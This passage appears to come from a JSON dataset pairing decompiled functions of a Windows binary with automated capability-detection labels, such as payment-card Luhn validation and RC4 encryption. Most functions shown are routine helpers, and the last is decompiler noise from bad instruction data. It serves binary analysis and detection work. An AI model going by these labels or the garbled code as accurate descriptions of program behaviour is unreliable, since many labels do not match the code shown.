0x140101220;\n    piVar2[0x18] = 0x140101228;\n    piVar2[0x19] = L\"January\";\n    piVar2[0x1a] = L\"February\";\n    piVar2[0x1b] = L\"March\";\n    piVar2[0x1e] = L\"June\";\n    piVar2[0x1f] = L\"July\";\n    piVar2[0x20] = L\"August\";\n    piVar2[0x21] = L\"September\";\n    piVar2[0x22] = L\"October\";\n    piVar2[0x23] = L\"November\";\n    piVar2[0x24] = L\"December\";\n    piVar2[0x25] = 0x1401012dc;\n    piVar2[0x30] = 0x14010132c;\n    piVar2[0x26] = 0x1401012e4;\n    piVar2[0x27] = 0x1401012ec;\n    piVar2[0x2a] = 0x1401012fc;\n    piVar2[0x2b] = 0x140101304;\n    piVar2[0x2c] = 0x14010130c;\n    piVar2[0x2d] = 0x140101314;\n    piVar2[0x2e] = 0x14010131c;\n    piVar2[0x2f] = 0x140101324;\n    return;\n}\n",
        "token_count": 1326
    },
    "14007a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007a800(ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    \n    arg1[2] = arg2;\n    *(arg1 + 1) = arg3 != 0;\n    *arg1 = 0x14010a7f0;\n    uVar1 = fcn.14009f6b0();\n    arg1[4] = uVar1;\n    fcn.14007a400(arg1);\n    return;\n}\n",
        "token_count": 114
    },
    "14007acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007acc0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140103240 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 121
    },
    "14007af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007af40(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x1401032f0 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103250 + 0x10;\n    return;\n}\n",
        "token_count": 140
    },
    "14007b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14007b200(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    bool bVar8;\n    uint32_t uStack68;\n    \n    iVar7 = 100;\n    do {\n        uVar1 = rdrand();\n        bVar8 = rdrandIsValid();\n        uVar2 = uVar1;\n        if (bVar8) {\n            uVar2 = 1;\n        }\n        if (uVar2 != 0) {\n            return uVar1;\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    pcVar6 = \"random_device: rdrand failed\";\n    fcn.1400b7210(\"random_device: rdrand failed\");\n    uStack68 = rdseed();\n    bVar8 = rdseedIsValid();\n    if (bVar8) {\ncode_r0x00014007b260:\n        uVar3 = uStack68;\n    }\n    else {\n        iVar7 = 99;\n        do {\n            uStack68 = rdseed();\n            bVar8 = rdseedIsValid();\n            if (bVar8) goto code_r0x00014007b260;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n        if (pcVar6 == NULL) {\n            fcn.1400b7210(\"random_device: rdseed failed\");\n            uVar4 = sub.msvcrt.dll_setlocale(0, 0);\n            iVar5 = sub.msvcrt.dll_strlen(uVar4);\n            uVar3 = fcn.1400b6500(iVar5 + 1);\n            if (uVar3 != 0) {\n                sub.msvcrt.dll_memcpy(uVar3, uVar4, iVar5 + 1);\n                sub.msvcrt.dll_setlocale(0, 0x140100e40);\n            }\n            return uVar3;\n        }\n        uVar3 = (*pcVar6)(0);\n    }\n    return uVar3;\n}\n",
        "token_count": 478
    },
    "14007b2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14007b2b0(void)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    iVar3 = fcn.1400b6500(iVar2 + 1);\n    if (iVar3 != 0) {\n        sub.msvcrt.dll_memcpy(iVar3, uVar1, iVar2 + 1);\n        sub.msvcrt.dll_setlocale(0, 0x140100e40);\n    }\n    return iVar3;\n}\n",
        "token_count": 146
    },
    "14007c18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007c180(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.msvcrt.dll__fileno_1(*arg1);\n    fcn.14000fb10(uVar1, arg2, arg3);\n    return;\n}\n",
        "token_count": 72
    },
    "14007c39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14007c390(ulong arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint16_t uStack82;\n    int64_t iStack64;\n    \n    uVar1 = fcn.14007bef0(arg1);\n    iVar2 = (*_sym.imp.msvcrt.dll__fstat64)(uVar1);\n    if ((iVar2 == 0) && ((uStack82 & 0xf000) == 0x8000)) {\n        uVar1 = fcn.14007bef0(arg1);\n        iVar3 = fcn.14000fb10(uVar1, 0, 1);\n        return iStack64 - iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "14007cca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007cca0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140103240 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103260 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "14007ce9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007ce90(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140103240 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103270 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "14007d08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007d080(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140103240 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103280 + 0x10;\n    return;\n}\n",
        "token_count": 138
    },
    "14007d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00014007dbd8) overlaps instruction at (ram,0x00014007dbd4)\n// \n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffffffffff90 : 0x00014010039e\n// WARNING: Removing unreachable block (ram,0x0001401002aa)\n// WARNING: Removing unreachable block (ram,0x00014010026a)\n// WARNING: Removing unreachable block (ram,0x0001401002f2)\n// WARNING: Removing unreachable block (ram,0x0001400fd970)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * fcn.14007d900(char *arg1, ulong noname_1, char **arg3)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    ulong *puVar9;\n    char cVar10;\n    char cVar11;\n    char cVar12;\n    uint8_t uVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    char *pcVar16;\n    ulong *puVar17;\n    uint64_t uVar18;\n    uint8_t *puVar19;\n    uint8_t *puVar20;\n    int32_t *piVar21;\n    char *pcVar22;\n    int32_t *piVar23;\n    char *pcVar24;\n    uint8_t uVar25;\n    uint8_t uVar26;\n    char cVar28;\n    uint32_t *puVar27;\n    ushort uVar29;\n    uint8_t uVar31;\n    char *pcVar30;\n    char cVar32;\n    uint8_t uVar33;\n    uint8_t uVar34;\n    uint8_t uVar35;\n    char **ppcVar36;\n    ulong *puVar37;\n    char **ppcVar38;\n    char **ppcVar39;\n    char **ppcVar42;\n    uint64_t unaff_RBP;\n    uchar *puVar43;\n    uint8_t *unaff_RSI;\n    uint8_t *puVar44;\n    uint32_t uVar45;\n    uint32_t uVar46;\n    uint *unaff_RDI;\n    ulong *in_R9;\n    ulong in_R11;\n    char *unaff_R15;\n    int64_t in_FS_OFFSET;\n    int64_t in_GS_OFFSET;\n    bool bVar47;\n    bool bVar48;\n    bool bVar49;\n    bool bVar50;\n    ulong in_XMM1_Qa;\n    ulong *in_stack_00000028;\n    char **in_stack_00000030;\n    uint8_t in_stack_00000048;\n    uchar auStack256 [144];\n    ulong uStack112;\n    uint *puStack104;\n    uchar auStack96 [56];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    char **ppcVar40;\n    char **ppcVar41;\n    \n    puVar37 = &stack0xffffffffffffff98;\n    uStack24 = *in_R9;\n    uStack16 = in_R9[1];\n    uStack40 = *in_stack_00000028;\n    uStack32 = in_stack_00000028[1];\n    puVar27 = 0x1400fd6a8;\n    uVar14 = in_stack_00000048 - 100 & 0xff;\n    pcVar16 = *(uVar14 * 4 + 0x1400fd6a8) + 0x1400fd6a8;\n    // switch table (44 cases) at 0x1400fd6a8\n    switch(uVar14) {\n    case 0:\n        uStack112 = 0x14007da12;\n        (**(*arg3 + 0x20))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, \n                           &stack0xffffffffffffffd8);\n        return arg1;\n    default:\n        uStack112 = 0x14007da42;\n        (**(*arg3 + 0x38))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, \n                           &stack0xffffffffffffffd8);\n        return arg1;\n    case 9:\n        uStack112 = 0x14007d9e2;\n        (**(*arg3 + 0x30))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, \n                           &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x10:\n        uStack112 = 0x14007d9b2;\n        (**(*arg3 + 0x18))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, \n                           &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x13:\n        uStack112 = 0x14007d982;\n        (**(*arg3 + 0x28))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, \n                           &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x16:\ncode_r0x00014007dc38:\n        uStack112 = 0x14007dc52;\n        (**(pcVar16 + 0x18))\n                  (uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x17:\n    case 0x18:\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x27:\n    case 0x28:\n    case 0x2a:\n    case 0x2b:\ncode_r0x00014007dc68:\n        uStack112 = 0x14007dc82;\n        (**(pcVar16 + 0x30))\n                  (uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x1f:\ncode_r0x00014007dc08:\n        uStack112 = 0x14007dc22;\n        (**(pcVar16 + 0x28))\n                  (uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &stack0xffffffffffffffe8, &stack0xffffffffffffffd8);\n        return arg1;\n    case 0x26:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n        break;\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0xa7:\n    case 0xa8:\n    case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3a:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0x4e:\n    case 0xad:\n    case 0xbe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0x4f:\n    case 0xae:\n    case 0xbf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0x50:\n    case 0xaf:\n    case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    case 0xb3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    case 0xb4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    case 0xb5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n        *pcVar16 = *pcVar16 + pcVar16;\n        pcVar24 = unaff_RBP - 3;\n        cVar11 = *pcVar24;\n        cVar10 = arg3 >> 8;\n        *pcVar24 = *pcVar24 + cVar10;\n        puVar20 = pcVar16 & 0xffffffff;\n        if (SCARRY1(cVar11, cVar10)) {\n            puVar20 = *0x1400fd6a8;\n        }\n        *puVar20 = *puVar20 + puVar20;\n        puVar19 = puVar20 + -3;\n        uVar33 = *puVar19;\n        cVar11 = arg1 >> 8;\n        *puVar19 = *puVar19 + cVar11;\n        if (SCARRY1(uVar33, cVar11)) {\n            puVar20 = *0x1400fd6a8;\n        }\n        cVar10 = puVar20;\n        *puVar20 = *puVar20 + cVar10;\n        *arg3 = *arg3 + cVar10;\n        *puVar20 = *puVar20 + cVar10;\n        *arg3 = *arg3 + cVar10;\n        *puVar20 = *puVar20 + cVar10;\n        pcVar16 = arg1 + -3;\n        cVar10 = *pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        if (SCARRY1(cVar10, cVar11)) {\n            puVar20 = *0x1400fd6a8;\n        }\n        *puVar20 = *puVar20 + puVar20;\n        puVar19 = unaff_RSI + -3;\n        uVar33 = *puVar19;\n        *puVar19 = *puVar19 + cVar11;\n        if (SCARRY1(uVar33, cVar11)) {\n            puVar20 = *0x1400fd6a8;\n        }\n        cVar11 = puVar20;\n        *puVar20 = *puVar20 + cVar11;\n        *unaff_RSI = *unaff_RSI + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        *arg1 = *arg1 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        puVar20[0x1400ffd] = puVar20[0x1400ffd] + 0xa8;\n        *puVar20 = *puVar20 + cVar11;\n        *0x1400fd6a8 = *0x1400fd6a8 & 0xffffff00 | *0x1400fd6a8 + 0xa8;\n        *puVar20 = *puVar20 + cVar11;\n        *0x1400fd6a8 = *0x1400fd6a8 & 0xffffff00 | *0x1400fd6a8 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        *(arg3 + 0x1400ffd) = *(arg3 + 0x1400ffd) + arg3;\n        *puVar20 = *puVar20 + cVar11;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + arg3;\ncode_r0x000140100075:\n        cVar11 = puVar20;\n        *puVar20 = *puVar20 + cVar11;\n        cVar10 = puVar27;\n        *(puVar20 * 2) = *(puVar20 * 2) + cVar10;\n        *puVar20 = *puVar20 + cVar11;\n        *0xa500000001400ffd = cVar11 + *puVar20;\n        pcVar16 = puVar20 & 0xffffffffffffff00 | *0xa500000001400ffd;\n        cVar11 = *pcVar16;\n        *pcVar16 = *pcVar16 + *0xa500000001400ffd;\n        pcVar16 = puVar20 & 0xffffff00 | *0xa500000001400ffd;\n        if (SCARRY1(cVar11, *0xa500000001400ffd)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *(unaff_RDI + 0x1400ffd) = *(unaff_RDI + 0x1400ffd) + (pcVar16 >> 8);\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar11 = *puVar27;\n        cVar12 = arg3 >> 8;\n        *puVar27 = *puVar27 + cVar12;\n        if (SCARRY1(cVar11, cVar12)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar28 = puVar27 >> 8;\n        *(arg3 + 0x1400ffd) = *(arg3 + 0x1400ffd) + cVar28;\n        *pcVar16 = *pcVar16 + cVar11;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + cVar28;\n        *pcVar16 = *pcVar16 + cVar11;\n        *unaff_RDI = *unaff_RDI + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + cVar12;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar32 = arg1 >> 8;\n        pcVar16[0x1400ffd] = pcVar16[0x1400ffd] + cVar32;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        arg1[0x1400ffd] = arg1[0x1400ffd] + cVar32;\n        *pcVar16 = *pcVar16 + cVar11;\n        unaff_RSI[0x1400ffd] = unaff_RSI[0x1400ffd] + cVar32;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        pcVar16 = pcVar16 & 0xffffffffffffff00 | cVar11 * '\\x02';\n        if (SCARRY1(cVar11, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar32 = arg1 + cVar11;\n        if (SCARRY1(arg1, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        uVar18 = puVar27 & 0xffffffffffff0000;\n        uVar4 = CONCAT11(cVar28 + cVar11, cVar10);\n        puVar27 = uVar18 | uVar4;\n        if (SCARRY1(cVar28, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        pcVar16 = pcVar16 & 0xffffffffffffff00 | cVar11 + cVar10;\n        if (SCARRY1(cVar11, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *arg3 = *arg3 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        uVar33 = cVar32 + cVar10;\n        pcVar24 = arg1 & 0xffffffffffffff00 | uVar33;\n        if (SCARRY1(cVar32, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        cVar11 = arg3;\n        uVar6 = arg3 & 0xffffffffffff0000;\n        uVar7 = CONCAT11(cVar12 + cVar10, cVar11);\n        pcVar22 = uVar6 | uVar7;\n        if (SCARRY1(cVar12, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar12 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar12;\n        *pcVar22 = *pcVar22 + cVar12;\n        *pcVar16 = *pcVar16 + cVar12;\n        *pcVar22 = *pcVar22 + cVar12;\n        *pcVar16 = *pcVar16 + cVar12;\n        uVar25 = cVar10 + cVar11;\n        uVar4 = uVar4 & 0xffffffffffffff00;\n        uVar8 = uVar18 | uVar4;\n        puVar27 = uVar8 | uVar25;\n        if (SCARRY1(cVar10, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        cVar10 = pcVar16 >> 8;\n        pcVar16 = pcVar16 & 0xffffffffffff0000 | CONCAT11(cVar10 + cVar11, pcVar16);\n        if (SCARRY1(cVar10, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        cVar10 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar10;\n        *puVar27 = *puVar27 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar22 = *pcVar22 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        cVar10 = uVar7 >> 8;\n        uVar7 = CONCAT11(cVar10 + cVar11, cVar11);\n        pcVar22 = uVar6 | uVar7;\n        if (SCARRY1(cVar10, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        uVar26 = uVar25 + uVar33;\n        puVar27 = uVar8 | uVar26;\n        if (SCARRY1(uVar25, uVar33)) {\n            pcVar16 = *puVar27;\n        }\n        cVar10 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar22 = *pcVar22 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar22 = *pcVar22 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        cVar12 = pcVar16 >> 8;\n        pcVar16 = pcVar16 & 0xffffffffffff0000 | CONCAT11(cVar12 + uVar33, cVar10);\n        if (SCARRY1(cVar12, uVar33)) {\n            pcVar16 = *puVar27;\n        }\n        cVar10 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar10;\n        pcVar22[0x1400ff6] = pcVar22[0x1400ff6] + uVar26;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar24 = *pcVar24 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar24 = *pcVar24 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        cVar10 = (arg1 & 0xffffffffffffff00) >> 8;\n        uVar8 = CONCAT11(cVar10 + uVar33, uVar33);\n        pcVar24 = arg1 & 0xffffffffffff0000 | uVar8;\n        if (SCARRY1(cVar10, uVar33)) {\n            pcVar16 = *puVar27;\n        }\n        cVar10 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar10;\n        pcVar22[0x1400ff6] = pcVar22[0x1400ff6] + uVar26;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar24 = *pcVar24 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar24 = *pcVar24 + cVar10;\n        *pcVar16 = *pcVar16 + cVar10;\n        cVar10 = pcVar16 >> 8;\n        uVar25 = cVar11 + cVar10;\n        uVar7 = uVar7 & 0xffffffffffffff00;\n        pcVar22 = uVar6 | uVar7 | uVar25;\n        if (SCARRY1(cVar11, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        pcVar22[0x1400ff6] = pcVar22[0x1400ff6] + uVar26;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar24 = *pcVar24 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar11 = pcVar16 >> 8;\n        cVar10 = uVar4 >> 8;\n        uVar4 = CONCAT11(cVar10 + cVar11, uVar26);\n        puVar27 = uVar18 | uVar4;\n        if (SCARRY1(cVar10, cVar11)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        pcVar22[0x1400ff6] = pcVar22[0x1400ff6] + uVar26;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar24 = *pcVar24 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar10 = uVar4 >> 8;\n        pcVar16 = pcVar16 & 0xffffffffffffff00 | cVar11 + cVar10;\n        if (SCARRY1(cVar11, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        uVar34 = uVar33 + cVar10;\n        uVar8 = uVar8 & 0xffffffffffffff00;\n        pcVar24 = arg1 & 0xffffffffffff0000 | uVar8 | uVar34;\n        if (SCARRY1(uVar33, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        cVar11 = uVar7 >> 8;\n        uVar7 = CONCAT11(cVar11 + cVar10, uVar25);\n        pcVar22 = uVar6 | uVar7;\n        if (SCARRY1(cVar11, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *(unaff_RBP + 0x1400ff4) = *(unaff_RBP + 0x1400ff4) + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        uVar31 = uVar7 >> 8;\n        uVar33 = uVar26 + uVar31;\n        uVar18 = uVar18 | uVar4 & 0xffffffffffffff00;\n        puVar27 = uVar18 | uVar33;\n        if (SCARRY1(uVar26, uVar31)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        cVar11 = pcVar16 >> 8;\n        piVar21 = pcVar16 & 0xffffffffffff0000 | CONCAT11(cVar11 + uVar31, pcVar16);\n        if (SCARRY1(cVar11, uVar31)) {\n            piVar21 = *puVar27;\n        }\n        cVar10 = piVar21;\n        *piVar21 = *piVar21 + cVar10;\n        *puVar27 = *puVar27 + cVar10;\n        